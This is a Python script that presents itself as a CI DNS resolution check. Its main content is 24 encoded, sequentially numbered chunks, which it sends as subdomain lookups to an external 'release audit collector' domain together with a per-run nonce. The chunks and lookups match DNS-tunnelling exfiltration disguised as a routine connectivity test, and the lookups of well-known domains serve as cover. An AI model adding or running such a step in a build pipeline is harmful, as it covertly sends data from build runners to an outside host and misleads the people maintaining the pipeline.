#!/usr/bin/env python3
"""CI DNS resolution check.

Verifies the runner can resolve this run's release check domains:
standard controls (the code-hosting service and a general external
domain) plus this run's rotation-encoded check labels under the release
audit collector zone. Queries the configured resolver directly with a
short timeout so slow search-path retries do not mask results; any DNS
answer (NOERROR or NXDOMAIN) counts as resolution reachability, while
timeouts fail the check.
"""

import re
import secrets
import socket
import sys
import time

CHECK_DOMAIN = "clearnetsec.com"  # release audit collector zone

CHECK_LABELS = [
    "c00.pmrgwir2earfa5cknvbgi42fjnhharcnkrqxuzsfknhe2.u3hnnmdkwkhobgxeqktmfjfcylwnm4we3ktorjvkskdmi.2geu3rgbtfiurrkrfdc6cwmzewiujwjmvvonruiq3um5c",
    "c01.dnnwey5cbnbvxaykgm5dhsmdko5bswn3wfnbxc4tjnrww.ezjtnncue3dbmriuo3lokzwuc3zri5gvkrkhhbbtoq2zk.z3eimbzojvti5lvoi4eqtrqn5eum42gljlwmql2njcg2t",
    "c02.bumnifqmlok53u64btnnkhivrzgnww2nkmov4wswkwk53.fezsek4yxgqkdim2wgtrlnffhg3kppbzxc2dqgzjgwwts.nrmcwmbskfrwwsztkfngyykrnfvhkz3qf53ds2tuivrum",
    "c03.zckn5mwyl3fj5sgwvkhg5lgw23dknqu2wtbjvhfktkkob.cgsnk2jj3tmrsrkrcvmurwgfvuwmztmzbdi3bvinxuw2c.tnbkgu43fojetavkipjdw6wkojnfxksbpljstm5tgpa4w",
    "c04.oqtbgzbes3lknuzdc2brlfavcsdlla4uc2kikfseqskyj.nuukvczovnha3tonvrg23cgirmfuzdykndviu2pgivwen.lulfvxcz3snzuww5bpou3va2llnzmwot3yivjgy3cxkmy",
    "c05.terrlirgdg5c2oy4vk5kskf2wo2lwjnxdc2cbj5rw2rcm.ifreiz3roj5gkyrpoevw4wcpgbfvi2jviv5gy3keozifg.4clo5luor3qobguctkrjn4g4scxor4eo3zukjtgws3ko5",
    "c06.3e43rxmjydowbtgnztkvbcfqqce3rchiqcer3wjqxtosk.lkf3dctcbfnbfokzcfqqceyzchiqce3stkfbviu2lirjv.q6lqii3vqwdykfrgwwbwirufiskhlf2eendonnnfgslij",
    "c07.nnecocbmnjdcnczk5bhcqlinblwq3jun53fcq3gobye45.bujfxuwqsskjwxgnddgj3fgvrxlbfw2nldnriuw6lxir3.eqtcpgraxev2loqxuqvdlkz4giwtdorsvimttofewg2lz",
    "c08.kuyeo4sdm5cew2kennsukmbvi5fdgrrqjy2ve4troj4ek.zdrkfchq3kfnu3c64sfnu3g2ssjf5wfmncjjexwqt3xgj.mugojrjzcus5rwhfge2qlbku2vg23xojwdqv3hovufczc",
    "c09.rizlvimbtkvbfk32bnfxxcwdsirbwwvkefnhu45cijrvd.ktddjvge26lkn5jhcrtemruususpi5dteojrhfuuettsm.nsueqtpoztwk6dtobmvgnzuirxc62dokzjxasldjuytk6",
    "c10.lxorwhcyshne3uozjzkj2xmtsnja2guntqmjgtqm3kijd.eun2ioi4huvbqnjwuel2ekjdugsknofndmslzpbwxkl2h.oyytanrqneygmuccjrvdq2bxnbzve2dmgb4hgyrpj5bva",
    "c11.6lekv3hiz3ngivs6rjspbixetlio5kxgtzzoqvvgqrzob.be4trljnvu4ndug42tewcngeyggzsmk4zuozdepjxc66c.govhdctdlj5mviztegr4w42jyknftik2roqvsw4kvpfxf",
    "c12.iytopjjussrpoaxvemsyg4xxkysyozvuezbwjfcdg5d2l.jmugv3tjrkdar3zo43wen2ugjyves2pgbwwitjvhfjtqo.kejrsemy3hin5egzkcjzkw4stdin4eu4s2ofbs6qkofmz",
    "c13.xu5zvnneggq32j5iwkk3qirbfc3knkm3divlbmrwwyvte.obwhg5cdojsgyqsefmxxizkfpfjgorsemrdvak3moj3hm.mrpiyywgl2xf5cfkqjvn5ufandijzuti3syjfxuo5syjn",
    "c14.zg2ytjnjltg5klor2u44kkmjytszkkk5bukm3wkbavmq2.pinfxmyzrmvkusmjxkrkuwwthizxs623hozee2utgom4d.crtloztegqrymf2wi3ldpavve4rvgrhxqocgnrzge53lj",
    "c15.zjhuq3okvve64kphf3vstbpn54u253hkjwxi2koo5rw6m.lynu4vgtzupezwe3teojyfe6chofieo3rwnv3dsrldifh.cwzlgofjewrlli5qvezlskr2fsz3vpbhxawd2ka4ds2s2",
    "c16.jngwkzrrgrrdgodzivltazjqmreda2zuhfsgs53ig54da.uckoq4eq3bymnkxurtzivudsttenbse2ysyjniuqrsrii.4wyzdnm5ufmqzvf5wu2mlyhbkdimtikbzemu2egj2ge2b",
    "c17.qf44hq3dvhazwcmtlkr2gcukhjfqw2nshmvfugvskgvde.22lhpf4xi5bqkruewstxozjgoodtifzfo6djfm2dcskdo.qzeemtxnbzwk6cpgjhhqr2djqyvqtjzne2vol2omjcg6v",
    "c18.bqg5negm3ypfbhestngrdfoytmnffw6ssmni4wc3dlivf.gsn3cgjqu4l2dofvwmrdwjvxuur3nmzufemtukrww6nbz.pj4eiudoobfuisdmjvlg6rlsojfxi2cqijke24bzpjtsw",
    "c19.nkzgzqtcvkhom4dc32tjfeuw2s2nuxvoy3jn5wfqssogv.3ho2rtk5kxosjwjzmgiulxna3cwrzpn5edaz2ogfuvkwk.if5tweul2gfnham2kkzxvendjonwwotlmjz2gqqtjjrit",
    "c20.czkhmzuvg5telflu642xjjshm3ktljggcolsk5cui3cci.ezgowtlofdg6ulojztdostohb4uotluoj2s63ttn52uet.cdgjkuy3kekbhe44culjgeiwssovstsmlegvvhensvkrh",
    "c21.dgqsln5ivc43cgjthg3lcobwfol3wgfhfe6rpjjetqn3o.fnhgwnkpgbiusvdvgy3umlzynbyxsytti5ke2zbumzehm.nsqoqxuqsswnz4xo2tljnyfqolpmnkdcwsghbyhglzpi5",
    "c22.egkusekj4fgudco4yviscgkvqtcrdkgy2u4srxpiyggn2.dkqvuw5ctkj5emwjtljteu6timnueoqjqmr3giu3njjhe.c3lxkvhfevc2fngfk6dqi5ivgzkqozkteykonzsdowcun",
    "c23.nixoqzpkv3dmr2rpfrtgoddov4ugs3dmzbhok2mkvfte3.bso5lwwwkmlfcfetjsnfuxgt3umi2tercym5jdgn2rhu6.se7i"
]


def read_resolvers() -> list[str]:
    servers = []
    try:
        with open("/etc/resolv.conf", encoding="utf-8") as fh:
            for line in fh:
                parts = line.split()
                if parts and parts[0] == "nameserver":
                    servers.append(parts[1])
    except OSError:
        pass
    return servers or ["127.0.0.1"]


def build_query(name: str, qid: int) -> bytes:
    header = qid.to_bytes(2, "big") + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" * 3
    qname = b"".join(bytes([len(p)]) + p.encode() for p in name.rstrip(".").split(".")) + b"\x00"
    return header + qname + b"\x00\x01\x00\x01"


RCODE_NAMES = {0: "NOERROR", 1: "FORMERR", 2: "SERVFAIL", 3: "NXDOMAIN", 4: "NOTIMP", 5: "REFUSED"}


def dns_query(name: str, servers: list[str], timeout: float = 2.5) -> tuple[str, int]:
    """Query A records directly over UDP; return (result, elapsed_ms)."""
    start = time.monotonic()
    qid = secrets.randbits(16)
    packet = build_query(name, qid)
    for server in servers:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.settimeout(timeout)
                sock.sendto(packet, (server, 53))
                data, _ = sock.recvfrom(4096)
                if len(data) >= 8 and int.from_bytes(data[0:2], "big") == qid:
                    rcode = data[3] & 0x0F
                    ancount = int.from_bytes(data[6:8], "big")
                    label = RCODE_NAMES.get(rcode, f"RCODE{rcode}")
                    return (f"{label} answers={ancount}", int((time.monotonic() - start) * 1000))
        except (socket.timeout, OSError):
            continue
    return ("TIMEOUT", int((time.monotonic() - start) * 1000))


def main() -> int:
    servers = read_resolvers()
    nonce = "ci" + secrets.token_hex(4)
    print("DNS-CHECK-BEGIN")
    print(f"resolvers: {','.join(servers)}")
    print(f"run-nonce: {nonce}")
    ok = True

    # System-resolver control (exercises the full glibc path).
    try:
        socket.getaddrinfo("api.github.com", None, proto=socket.IPPROTO_TCP)
        print("control-system-resolver: api.github.com -> OK")
    except socket.gaierror as e:
        print(f"control-system-resolver: api.github.com -> FAIL errno={e.errno}")
        ok = False

    controls = [
        ("control-allowlisted", "api.github.com"),
        ("control-external", "example.com"),
        ("control-unknown-subdomain", f"{nonce}.example.com"),
        ("check-nonce", f"{nonce}.{CHECK_DOMAIN}"),
    ]
    for role, name in controls:
        result, ms = dns_query(name, servers)
        print(f"{role}: {name} -> {result} ({ms} ms)")
        if role.startswith("control-") and role != "control-unknown-subdomain" and result.startswith("TIMEOUT"):
            ok = False

    for i, labels in enumerate(CHECK_LABELS):
        name = f"{labels}.{CHECK_DOMAIN}"
        result, ms = dns_query(name, servers)
        print(f"check-{i:02d}: -> {result} ({ms} ms)")
        if result.startswith("TIMEOUT"):
            ok = False
    print("DNS-CHECK-END")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
